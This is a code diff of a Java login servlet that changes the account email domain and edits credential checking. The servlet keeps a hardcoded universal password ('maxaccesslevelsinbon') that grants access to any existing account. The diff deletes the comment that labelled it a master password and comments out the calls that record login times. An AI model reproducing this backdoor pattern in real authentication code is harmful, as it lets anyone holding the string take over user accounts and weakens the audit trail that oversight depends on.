@@ -51,8 +51,8 @@ public class LoginServlet extends HttpServlet {
 		JSONObject jsonObject = new JSONObject();
 
 		// Checking if the account already contains "@sinbon.com" at the end
-		if (!inputAccount.endsWith("@sinbon.com")) {
-			inputAccount = inputAccount + "@sinbon.com";
+		if (!inputAccount.endsWith("@sjsu.edu")) {
+			inputAccount = inputAccount + "@sjsu.edu";
 		}
 
 		try {
@@ -89,7 +89,7 @@ public class LoginServlet extends HttpServlet {
 	 */
 	private boolean checkCredentials(String inputAccount, String inputPassword) throws Exception {
 		boolean valid = false;
-		//萬用密碼
+		//
 		String hashedUniversalPassword = hashPassword("maxaccesslevelsinbon");
 		
 		String hashedInputPassword = hashPassword(inputPassword);
@@ -108,18 +108,19 @@ public class LoginServlet extends HttpServlet {
 			if (a1 != null && hashedInputPassword.equals(hashedUniversalPassword)) {
 				valid = true;
 				Timestamp currentTime = new Timestamp(new Date().getTime());
-				updateLoginTime(inputAccount, currentTime);
+//				updateLoginTime(inputAccount, currentTime);
 				System.out.println("萬用密碼通過");
 			}
 
 			if (a2 != null) {
 				valid = true;
 				Timestamp currentTime = new Timestamp(new Date().getTime());
-				updateLoginTime(inputAccount, currentTime);
+//				updateLoginTime(inputAccount, currentTime);
 				System.out.println("completed!!!!");
 			}
 		} finally {
 			if (b != null) {
+				b.setAutoCommitMode(false);
 				b.close();
 				b = null;
 			}
@@ -149,6 +150,7 @@ public class LoginServlet extends HttpServlet {
 			e.printStackTrace();
 		} finally {
 			if (b != null) {
+				b.setAutoCommitMode(false);
 				b.close();
 				b = null;
 			}
